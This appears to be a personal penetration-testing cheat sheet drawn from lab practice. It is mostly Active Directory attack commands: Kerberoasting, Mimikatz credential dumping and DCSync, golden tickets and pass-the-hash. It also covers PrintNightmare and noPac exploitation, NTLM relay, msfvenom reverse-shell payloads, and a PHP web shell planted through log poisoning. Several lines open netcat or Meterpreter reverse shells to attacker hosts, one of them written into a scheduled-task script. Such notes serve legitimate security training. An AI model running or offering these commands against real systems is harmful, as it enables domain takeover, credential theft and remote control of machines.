PS> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} | select samaccountname,useraccountcontrol
PS> Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
PS> Get-DomainUser * -spn | select samaccountname
PS> Get-DomainUser -Identity TestUser | Get-DomainSPNTicket -Format Hashcat
PS> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\hoge_tgs.csv -NoTypeInformation
PS> Get-DomainUser TestSpn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
PS> $sid = Convert-NameToSid TestUser
# Group
PS> Get-DomainGroupMember -Identity "Domain Admins" -Recurse
PS> Get-DomainGroupMember -Identity "Test Group" | Select MemberName
PS> Get-DomainGroupMember -Identity "Test Group" | Select MemberName |? {$_.MemberName -eq 'TestUser'} -Verbose
PS> Get-DomainGroup -Identity "TestGroup" | select memberof
##　lateral, remote, rdp
PS> Get-NetLocalGroupMember -ComputerName TestComputer -GroupName "Remote Desktop Users"
##　lateral, remote, WinRM
PS> Get-NetLocalGroupMember -ComputerName TestComputer -GroupName "Remote Management Users"
## clear
PS> Remove-DomainGroupMember -Identity "Test Group" -Members 'TestUser' -Credential $Cred -Verbose
# ACL
PS> Find-InterestingDomainAcl
PS> $TestUserSid = Convert-NameToSid TestUser
PS> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $TestUserSid}
PS> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $TestUserSid} -Verbose
PS> $TestGroupSid = Convert-NameToSid "TestGroup"
PS> Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $TestGroupSid}
# Trust
PS> Get-DomainTrustMapping
PS> Test-AdminAccess -ComputerName TestHostDC
# Change Password
PS> $TestUserSecPassword = ConvertTo-SecureString 'TestUserPassword' -AsPlainText -Force
PS> $Cred = New-Object System.Management.Automation.PSCredential('HOGE\TestUser', $TestUserSecPassword)
PS> $TargetUserSecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
PS>Set-DomainUserPassword -Identity TargetUser -AccountPassword $TargetUserSecPassword -Credential $Cred -Verbose
# Create Fake SPN
PS> $TestUserSecPassword = ConvertTo-SecureString 'TestUserPassword' -AsPlainText -Force
PS> $Cred = New-Object System.Management.Automation.PSCredential('HOGE\TestUser', $TestUserSecPassword)
PS> Set-DomainObject -Credential $Cred -Identity TargetUser -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
## clear
PS> Set-DomainObject -Credential $Cred -Identity adunn -Clear serviceprincipalname -Verbose
# Workaround Kerberos "Double Hop" Problem
## PSCredential Object
Remote Accessed PS> import-module .\PowerView.ps1
Remote Accessed PS> get-domainuser -spn
### error
Remote Accessed PS> klist
Remote Accessed PS> $SecPassword = ConvertTo-SecureString 'TestPassword' -AsPlainText -Force
Remote Accessed PS> $Cred = New-Object System.Management.Automation.PSCredential('HOGE\TestUser', $SecPassword)
Remote Accessed PS> get-domainuser -spn -credential $Cred | select samaccountname
### ok
Remote Accessed PS> get-domainuser -spn | select
###  without specifying the -credential flag, error
```

# SharpView
```powershell
PS> .\SharpView.exe Get-DomainUser -Help
PS> .\SharpView.exe Get-DomainUser -Identity TestUser
```

# targetedKerberoast
https://github.com/ShutdownRepo/targetedKerberoast

# PowerUpSQL
tag: shell. MS-SQL
https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet
```powershell
PS> Import-Module .\PowerUpSQL.ps1
PS> Get-SQLInstanceDomain
PS> Get-SQLQuery -Verbose -Instance "XXX.XXX.XXX.XXX,1433" -username "hoge\TestUser" -password "TetsPassword" -query 'Select @@version'
```


# Metasploit
```zsh
# Metasploit
```zsh
$ msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe
$ msfvenom -l payloads
$ msfvenom -p java/jsp_shell_reverse_tcp --list-options
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.1.5 LPORT=4444 -f war > shell.war
> set TARGETURI /manager/html
> set HttpPassword Tomcatadm
> set HttpUsername tomcat
> set LHOST 172.16.1.5
> set RHOSTS 172.16.1.11
> set RPORT 8080
# Download Module Manually
## search 50064.rb
## https://www.exploit-db.com/exploits/50064
$ cp ~/Downloads/50064.rb /usr/share/metasploit-framework/modules/my/50064.rb
$ msfconsole -m /usr/share/metasploit-framework/modules/
manual payload download
/usr/share/metasploit-framework/modules/exploits
/usr/share/metasploit-framework/modules/auxiliary
I try. only above folder can be impacted to search and use command
msf6 > reload_all
#
msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=10.50.65.31 LPORT=4444 -o myservice.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.50.65.31 LPORT=4445 -f msi > myinstaller.msi

msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST 10.50.65.31; set LPORT 4445;exploit"
#
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.50.31.110 LPORT=443 -f psh -o shell.ps1
sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.50.31.110; set LPORT 443; exploit"
#
download C:\\Users\\t1_trevor.jones\\Documents\\PasswordDatabase.kdbx /root
```


$service = Get-Service -Name FoxitReaderUpdateService | Write-Output "Executable Path : $($service.PathName)"
... no display

https://learn.microsoft.com/ja-jp/powershell/module/microsoft.powershell.management/get-service?view=powershell-7.4
PowerShell 6.0 以降では、ServiceController オブジェクトに UserName、Description、DelayedAutoStart、BinaryPathName、StartupType の各プロパティが追加されています。

$PSVersionTable.PSVersion

Get-ExecutionPolicy -List



## next
# Specify the path to the HR subfolder
# Specify the security group name
# Remove the default group from NTFS permissions
# Disable inheritance before setting specific NTFS permissions
# Set NTFS permissions using icacls
$subFolderPath = 'C:\Users\htb-student\Company Data\HR'; $securityGroupName = 'HR'; icacls $subFolderPath /remove "Users"; icacls $subFolderPath /inheritance:r; icacls $subFolderPath /grant "${securityGroupName}:(OI)(CI)M", "${securityGroupName}:(OI)(CI)RX", "${securityGroupName}:(OI)(CI)R", "${securityGroupName}:(OI)(CI)W"

# Linux Buit-In
```zsh
# check service
$ systemctl list-units --type=service
$ systemctl show -p Type syslog.service
#
$ cat /etc/passwd | grep -v "false\|nologin" | cut -d":" -f1
# find index number - inode
$ stat sudoers
  File: sudoers
  Size: 755             Blocks: 8          IO Block: 4096   regular file
Device: 801h/2049d      Inode: 147627      Links: 1
Access: (0440/-r--r-----)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2024-01-01 08:21:19.971766710 +0000
Modify: 2018-01-18 00:08:16.000000000 +0000
Change: 2021-08-03 12:08:36.494845988 +0000
 Birth: -
$ ls -i sudoers
147627 sudoers
# column command
## column command might be useful for a dman diplay of volatility 3
$ cat /etc/passwd | grep -v "false\|nologin" | tr ":" " " | column -t

root         x  0     0      root               /root        /bin/bash
sync         x  4     65534  sync               /bin         /bin/sync
mrb3n        x  1000  1000   mrb3n              /home/mrb3n  /bin/bash
```

# Snaffer  
tag: scan, Share
https://github.com/SnaffCon/Snaffler  
```powershell
PS> Snaffler.exe -s -d hoge.local -o snaffler.log -v data
```


# Samba
## smbclient
```zsh
$ smbclient -U TestUser -N XXX.XXX.XXX.xXX
```

## rpcclient
https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration  
https://cheatsheet.haax.fr/network/services-enumeration/135_rpc/  
```zsh
$ rpcclient -U "" -N XXX.XXX.XXX.XXX
rpcclient $> querydominfo
rpcclient $> getdompwinfo
rpcclient $> enumdomusers
rpcclient $> queryuser 0x457
rpcclient $> queryuser (RID(hex))
$ rpcclient -U "" -N 172.16.5.5 -c "queryuser 1170"
$ rpcclient -U "" -N 172.16.5.5 -c "enumdomgroups" > a.txt
$ grep Intern a.txt
group:[Interns] rid:[0xff0]
$
$ echo $((16#ff0))
4080
# password spray
$ for u in $(cat valid_users.txt);do rpcclient -U "$u%TestPassword" -c "getusername;quit" 172.16.0.10 | grep Authority; done
```

## targeting single user
```powershell
PS> Add-Type -AssemblyName System.IdentityModel
PS> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "vmware/inlanefreight.local:1433"
PS> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "vmware/inlanefreight.local"
```

# pth-tookit
https://github.com/byt3bl33d3r/pth-toolkit

# Mimikatz
```zsh
PS> mimikatz.exe
mimikatz# privilege::debug
mimikatz# base64 /out:true
mimikatz# kerberos::list /export
mimikatz# kerberos::purge
## linux
# $ echo "<base64 TestUser>" |  tr -d \\n
# $ cat encoded_file | base64 -d > TestUser.kirbi
mimikatz# kerberos::ptt Target.kirbi
mimikatz# kerberos::golden /sid:TargetSid /domain:hoge.com /target: TestWeb.corp.com /service:http /rc4:TargetRc4 /ptt /user:TestUser
mimikatz# kerberos::golden /user:TestUser /domain:hoge.com /sid:TargetSid /krbtgt:KrbtgtNtlmHash /ptt
mimikatz# tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc
mimikatz# tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc
mimikatz# tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc
mimikatz# sekurlsa::logonpasswords
mimikatz# sekurlsa::tickets /export
## PS> dir .\
mimikatz# sekurlsa::pth /user:TestUser /domain:hoge.com /rc4:TestRc4Hash /run:"c:\tools\nc64.exe -e cmd.exe XXX.XXX.XXX.XXX 5556"
mimikatz# sekurlsa::pth /user:TestUser /domain:hoge.com /ntlm:TestNtlmHash /run:powershell
mimikatz# lsadump::lsa /inject /name:TestUser
mimikarz# lsadump::lsa /patch
mimikatz# lsadump::dcsync /user:hoge\TestUser
mimikatz# lsadump::dcsync /user:hoge\krbtgt
mimikatz# lsadump::dcsync /domain:HOGE.COM /user:HOGE\administrator
mimikatz# misc::skelton
mimikatz# misc::cmd
```

# Rebeus
https://github.com/GhostPack/Rubeus
[msDS-SupportedEncryptionTypes](https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797)
```powershell
PS> Rubeus.exe harvest /interval:30
PS> echo XXX.XXX.XXX.XXX HOGE.com >> C:\Windows\System32\drivers\etc\hosts
PS> Rubeus.exe brute /password:Password1 /noticket
PS> Rubeus.exe kerberoast /stats
PS> Rubeus.exe kerberoast /outfile:hashes.txt
PS> Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
PS> Rubeus.exe kerberoast /user:testspn /nowrap
PS> Rubeus.exe asreproast
PS> Rubeus.exe asktgt /user:TEST-DC01$ /certificate:TestBase64EncodedText /ptt
```
```zsh
$ vim Rubeus_asreproast_TestUser_hash.txt
$ cat Rubeus_asreproast_TestUser_hash.txt
$ cat Rubeus_asreproast_TestUser_hash.txt | tr -d ' '
$ cat Rubeus_asreproast_TestUser_hash.txt | tr -d ' ' | wc -l
$ cat Rubeus_asreproast_TestUser_hash.txt | tr -d ' ' | tr -d '\n'
$ cat Rubeus_asreproast_TestUser_hash.txt | tr -d ' ' | tr -d '\n' | wc -l
$ cat Rubeus_asreproast_TestUser_hash.txt | tr -d ' \n\t'
$ cat Rubeus_asreproast_TestUser_hash.txt | tr -d ' \n\t' | sed 's/\$krb5asrep/\$krb5asrep\$23/'
$ cat Rubeus_asreproast_TestUser_hash.txt | tr -d ' \n\t' | sed 's/\$krb5asrep/\$krb5asrep\$23/' > ./Rubeus_asreproast_TestUser_hash_edit.txt
$ cat Rubeus_asreproast_TestUserhash_edit.txt
$ hashcat -m 18200 ./Rubeus_asreproast_TestUser_hash_edit.txt Pass.txt
```

# kirbi2john.py
```zsh
$ python2.7 kirbi2john.py TestUser.kirbi
```

# DCSync
```ps
# user: hoge
PS> Get-DomainUser -Identity hoge | select samaccountname,objectsid,memberof,useraccountcontrol |fl
# get sid
PS> sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
PS> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```

# SpoolSample.exe
```powershell
PS> SpoolSample.exe TestHost.HOGE.com "192.168.0.11"
```

# LDAP Pass-back Attacks
```zsh
$ sudo dpkg-reconfigure -p low slapd
```
- olcSaslSecProps.ldif
```
#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```

# Seatbelt
tag: scan
https://github.com/GhostPack/Seatbelt

# Lazagne
tag: scan

# sslstrip
https://github.com/moxie0/sslstrip

# PowerSploit
https://github.com/PowerShellMafia/PowerSploit

# PsExec
```powershell
PS> psexec64.exe \\MACHINE_IP -u TestAdminUser -p TestAdminPassword -i cmd.exe
PS> psexec64.exe -i \\TestHost -u hoge\TestUser -p TestPassword cmd.exe
# after overpass the hash
PS> PsExec.exe \\TargetHost cmd
```

# Inveigh
## powershell
```powershell
PS> Import-Module .\Inveigh.ps1
PS> (Get-Command Invoke-Inveigh).Parameters
PS> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
## c# exe
```powershell
PS> .\Inveigh.exe
```

# impacket
## GetNPUsers.py
tag: AS-REP Roast
```zsh
$ GetNPUsers.py -dc-host hoge.com -usersfile ./valid_userlist.txt hoge.com/ | tee output_GetNPUsers.ans
$ GetNPUsers.py -dc-host hoge.com -usersfile ./valid_userlist.txt -outputfile ./output_GetNPUsers.txt hoge.com/
```
## GetUserSPNs.py
tag: Keberoast
```zsh
$ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.local/piyo
$ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.local/piyo -request
$ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.local/piyo –request-user TestUser
$ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.local/piyo –request-user TestUser -outputfile TestUser_tgs
$ GetUserSPNs.py HOGE.local/TestUser:TestPassword -dc-ip XXX.XXX.XXX.XXX -request -outputfile GetUserSPNs-py_hashcat.txt
# -> Hashcat
##$ hashcat -m 13100 TestUser_tgs /usr/share/wordlists/rockyou.txt 
```
## ntlmrelayx.py
```zsh
$ ntlmrelayx.py -smb2support -t smb://XXX.XXX.XXX.XXX -debug
$ ntlmrelayx.py -debug -smb2support --target http://TestCa.HOGE.COM/certsrv/certfnsh.asp --adcs --template DomainController
```
## smbserver.py
```zsh
$ smbserver.py -smb2support -username TestUser -password TestPassword TestRemoteAppearFolder TestLocalDirectory
```
## secretsdump.py
```zsh
$ secretsdump.py -just-dc HOGE.com/TestUser@XXX.XXX.XXX.XXX
$ secretsdump.py -just-dc-user TestUser HOGE.com/TestUser:"TestPassword\!"@XXX.XXX.XXX.XXX
$ secretsdump.py -outputfile hoge-com_hashes -just-dc HOGE.com/TestUser@XXX.XXX.XXX.XXX
$ secretsdump.py -just-dc-user HOGE/administrator "Test-DC1$"@XXX.XXX.XXX.XXX -hashes TestNtHash:TestLmHash
$ secretsdump.py -sam sam.hive -system system.hive LOCAL
$ ls hoge-com_hashes*
$ secretsdump.py -ntds CopiedNtds.dit -system system.hive LOCAL
```
## psexec.py
tag: shell
```zsh
$ psexec.py HOGE.com/piyo:'TestPassword'@XXX.XXX.XXX.XXX
$ psexec.py -hashes TestLmHash:TestNtHash TestUser@XXX.XXX.XXX.XXX
```
## wmiexec.py
tag:shell
```zsh
$ wmiexec.py hoge.local/TestUser:'TestPassword'@XXX.XXX.XXX.XXX
# pth
$ wmiexec.py -hashes :TestNtHash Administrator@XXX.XXX.XXX.XXX
```
## mssqlclient.py 
tag: shell
- [xp_cmdshell](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15)
```zsh
$ mssqlclient.py HOGE/TestUser@XXX.XXX.XXX.XXX -windows-auth
SQL> help
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami /priv
```
## gettgtpkinit.py 
```zsh
$ gettgtpkinit.py HOGE.COM/TestADHost\$ -pfx-base64 TestBase64EncodedText TestDC.ccache
$ export KRB5CCNAME=TestDC.ccache
$ secretsdump.py -just-dc-user HOGE/administrator -k -no-pass "TestADHost$"@TestADHost.HOGE.COM
```
## getnthash.py
```zsh
$ getnthash.py -key TestNtHash HOGE.COM/Test-AD-Host$
```

# Evil-WinRM
https://github.com/Hackplayers/evil-winrm
```zsh
$ evil-winrm -i XXX.XXX.XXX.XXX -u TestUser
$ evil-winrm -i HOGE.com -u TestUser -H TestNTHash
```

# BloodHound  
https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/
```powershell
PS> BloodHound.exe
# On GUI
## Upload Data ... zip file
## Check ... Analysis Tab
```
```zsh
# cypher
## check Enter-PSSession feasibility
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
## check SQL Server Admin access feasibility
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```
## SharpHound
```powershell
PS> .\SharpHound.exe -c All --zipfilename hoge
PS> .\SharpHound.exe --CollectionMethods All --Domain HOGE.com --ExcludeDCs
```
## BloodHound.py
```zsh
$ sudo bloodhound-python -u 'TestService' -p 'TestServicePasssord' -ns XXX.XXX.XXX.XXX -d hoge.local -c all
$ sudo bloodhound-python -u 'TestUser' -p 'TestPassword' -ns XXX.XXX.XXX.XXX -d hoge.local -c all
$ ls
$ zip -r hoge_bh.zip *.json
$ sudo neo4j start
```

# noPac
https://github.com/Ridter/noPac
```zsh
$ sudo python3 scanner.py hoge.com/TestUser:TestPassword -dc-ip XXX.XXX.XXX.XXX -use-ldap
$ sudo python3 noPac.py hoge.com/TestUser:TestPassword -dc-ip XXX.XXX.XXX.XXX  -dc-host TestAdHost -shell --impersonate administrator -use-ldap
$ sudo python3 noPac.py hoge.com/TestUser:TestPassword -dc-ip XXX.XXX.XXX.XXX  -dc-host TestAdHost --impersonate administrator -use-ldap -dump -just-dc-user hoge/administrator
```

# cube0x0's CVE-2021-1675
https://github.com/cube0x0/CVE-2021-1675.git  
caution: need to use cube0x0's version of Impacke
```zsh
# $ rpcdump.py @XXX.XXX.XXX.XXX | egrep 'MS-RPRN|MS-PAR'
# $ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=XXX.XXX.XXX.XXX LPORT=8080 -f dll > testpayload.dll
# $ sudo smbserver.py -smb2support TestShare /path/to/testpayload.dll
# [msf](Jobs:0 Agents:0) >> use exploit/multi/handler
# [msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD windows/x64/meterpreter/reverse_tcp
# [msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST XXX.XXX.XXX.XXX
# [msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 8080
# [msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
$ sudo python3 CVE-2021-1675.py hoge.com/TestUser:TestPassword@XXX.XXX.XXX.XXX '\\XXX.XXX.XXX.XXX\TestShare\testpayload.dll'
# (Meterpreter 1)(C:\Windows\system32) > shell
```

# PKINITtools
https://github.com/dirkjanm/PKINITtools

# PetitPotam
https://github.com/topotam/PetitPotam
```zsh
# $ sudo ntlmrelayx.py -debug -smb2support --target http://TestCa.HOGE.COM/certsrv/certfnsh.asp --adcs --template DomainController
$ python3 PetitPotam.py XXX.XXX.XXX.XXX YYY.YYY.YYY.YYY
```

# certi
https://github.com/zer1t0/certi
locate CA

# Get-SpoolStatus.ps1
https://github.com/NotMedic/NetNTLMtoSilverTicket
tag: Enumerating for MS-PRN Printer Bug
```powershell
PS> Import-Module .\SecurityAssessment.ps1
PS> Get-SpoolStatus -ComputerName TEST-DC01.HOGE.COM
```

# SharpGPOAbuse

# mcafee-sitelist-pwd-decryption
tag: mcafee
python3 version is released.
https://github.com/funoverip/mcafee-sitelist-pwd-decryption
```zsh
$ mcafee_sitelist_pwd_decrypt.py TestMcafeeCryptedPassword
```

# GMSAPasswordReader
https://github.com/rvazarkar/GMSAPasswordReader

# Memo
```
C:/ProgramDara/McAfee/Agent/DB/ma.db
```

# Story
```zsh
$ echo "dsaffadsfdsafsf==" | tr -d \\n < result.txt
$ cat result.txt | base64 -d > sqldev.kirbi
$ pa2
$ python ./kirbi2john.py sqldev.kirbi
$ cat crack_file
$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
$ cat sqldev_tgs_hashcat
$ hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```
```zsh
$ http://XXX.XXX.XXX.XXX:RPORT/index.php?page=php://filter/read=convert.base64-encode/resource=index
$ echo "~~~" | base64 -d | grep ".php"
# access to : hoge/index.php"
$ ffuf -w -u http://XXX.XXX.XXX.XXX:RPORT/hoge/index.php?log=FUZZ
# access to : http://XXX.XXX.XXX.XXX:RPORT/hoge/index.php?log=../../../../../../var/log/nginx/access.log
$ curl -s "http://XXX.XXX.XXX.XXX:RPORT/index.php" -A '<?php system($_GET["cmd"]); ?>'
# access to : http://XXX.XXX.XXX.XXX:RPORT/hoge/index.php?log=../../../../../../var/log/nginx/access.log&cmd=id
# access to : http://XXX.XXX.XXX.XXX:RPORT/hoge/index.php?log=../../../../../../var/log/nginx/access.log
# php file
## <?php system($_GET["cmd"]); ?>
# User-Agent: <?php system($_GET['cmd']); ?>
$ curl -X POST 'http://XXX.XXX.XXX.XXX:8080/webshell/api' --data "action=exec&cmd=id" 
```
```powershell
PS> Get-Content .\cert_templates.txt | sls -Pattern "(Template\[|Backup Operators|Remote Desktop Users|Domain Users|Client Authentication|CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)"
PS> Get-Content .\cert_templates.txt -Raw `
| Foreach-Object {$_ -replace "\r\n", "aaaa" -replace "\n", "aaaa"} `
| sls -Pattern "Template\[31\].*?Template\[32\]" -AllMatches | Foreach-Object { $_.Matches.Value } `
| Foreach-Object {$_ -replace "aaaa", "`n"}
PS>
# not expected output
PS> certutil -v -template > cert_templates.txt
PS> net user <username> /domain
PS> Get-Content .\cert_templates.txt -Raw `
| Foreach-Object {$_ -replace "\r\n", "aaaa" -replace "\n", "aaaa"} `
| Select-String -Pattern "Template\[.*?\].*?(Backup Operators|Remote Desktop Users|Domain Users).*?(Template\[.)" -AllMatches | Foreach-Object { $_.Matches.Value } `
| Select-String -Pattern "Template\[.*?\].*?(Client Authentication).*?(Template\[.)" -AllMatches | Foreach-Object { $_.Matches.Value } `
| Select-String -Pattern "Template\[.*?\].*?(CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT).*?(Template\[.)" -AllMatches | Foreach-Object { $_.Matches.Value } `
| Select-String -Pattern "Template\[.*?\]" -AllMatches | Foreach-Object { $_.Matches.Value } `
| Foreach-Object {$_ -replace "aaaa", "`n"}
```
```zsh
PS> setspn.exe -Q */*
PS> Add-Type -AssemblyName System.IdentityModel
PS> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "TestSvc/TestHost.hoge.local:1433"
PS> setspn.exe -T HOGE.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
PS> .\mimikatz.exe
mimikatz # base64 /out:true
mimikatz # kerberos::list /export
$ echo "<base64 TestUser>" |  tr -d \\n
$ cat encoded_file | base64 -d > TestUser.kirbi
$ python2.7 kirbi2john.py TestUser.kirbi
$ ls
crack_file
$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > TestUser_tgs_hashcat
$ cat TestUser_tgs_hashcat
$krb5tgs$23$*TestUser.kirbi*$aaaa....$bbbb....
$ hashcat -m 13100 TestUser_tgs_hashcat /usr/share/wordlists/rockyou.txt 
```
## chisel delivery
```zsh
# XXX.XXX.XXX.XXX : Attacker IP
PS> Invoke-WebRequest -Uri http://XXX.XXX.XXX.XXX:80/chisel.exe
# error
PS> Invoke-WebRequest -Uri http://XXX.XXX.XXX.XXX:80/chisel.exe -OutFile C:\chisel.exe
# ok
```

## NoPac
```zsh
$ scanner.py hoge.com/TestUser:TestPassword -dc-ip XXX.XXX.XXX.XXX -use-ldap
$ noPac.py hoge.com/TestUser:TestPassword -dc-ip XXX.XXX.XXX.XXX  -dc-host TEST-DC01 -shell --impersonate administrator -use-ldap
$ ls
administrator_DC01.hoge.com.ccache  noPac.py   requirements.txt  utils
README.md  scanner.py
```
## PrintNightmare
```zsh
$ pip3 uninstall impacket
$ git clone https://github.com/cube0x0/impacket
$ cd impacket
$ ./setup.py install
$ rpcdump.py @XXX.XXX.XXX.XXX | egrep 'MS-RPRN|MS-PAR'
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YYY.YYY.YYY.YYY LPORT=8080 -f dll > testscript.dll
$ smbserver.py -smb2support TestShare /path/to/testscript.dll
Bleeding Edge Vulnerabilities
$ msfconsole
[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST YYY.YYY.YYY.YYY
LHOST => 10.3.88.114
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 8080
LPORT => 8080
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
#
$ CVE-2021-1675.py hoge.com/TestUser:TestPassword@XXX.XXX.XXX.XXX '\\YYY.YYY.YYY.YYY\TestShare\testscript.dll'
#
(Meterpreter 1)(C:\Windows\system32) > shell
```
## PetitPotam
```zsh
$ ntlmrelayx.py -debug -smb2support --target http://TEST-CA01.HOGE.COM/certsrv/certfnsh.asp --adcs --template DomainController
$ PetitPotam.py YYY.YYY.YYY.YYY XXX.XXX.XXX.XXX
$ ntlmrelayx.py -debug -smb2support --target http://TEST-CA01.HOGE.COM/certsrv/certfnsh.asp --adcs --template DomainController
$ gettgtpkinit.py HOGE.COM/TEST-DC01\$ -pfx-base64 TestBase64EncodedText TestDc01.ccache
$ export KRB5CCNAME=TestDc01.ccache
$ secretsdump.py -just-dc-user HOGE/administrator -k -no-pass "TEST-DC01$"@TEST-DC01.HOGE.COM
$ klist
$ crackmapexec smb XXX.XXX.XXX.XXX -u administrator -H TestNtHash
$ getnthash.py -key TestNtHash HOGE.COM/TEST-DC01$
$ secretsdump.py -just-dc-user HOGE/administrator "TEST-DC01$"@XXX.XXX.XXX.XXX -hashes TestNtHash:TestLmHash
PS> .\Rubeus.exe asktgt /user:TEST-DC01$ /certificate:TestBase64EncodedText /ptt
PS> klist
PS> .\mimikatz.exe
mimikatz# lsadump::dcsync /user:hoge\krbtgt
```

# config
```zsh
# unattended installations on Windows
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
# IIS
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```
```zsh
# Powershell
cmd> cmdtype %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
PS > Get-Content $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
# Credential Manager
cmd> cmdkey /list
cmd> runas /savecred /user:admin cmd.exe
cmd> type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
# PuTTy
PS > reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```
```zsh
cmd> schtasks /query /tn TestVulnTask /fo list /v
cmd> icacls c:\TestTasks\TestSchTask.bat
c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)
                    
cmd> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > c:\TestTasks\TestSchTask.bat
Attacker Linux Machine> nc -lvp 4444
C:\> schtasks /run /tn TestVulnTask
```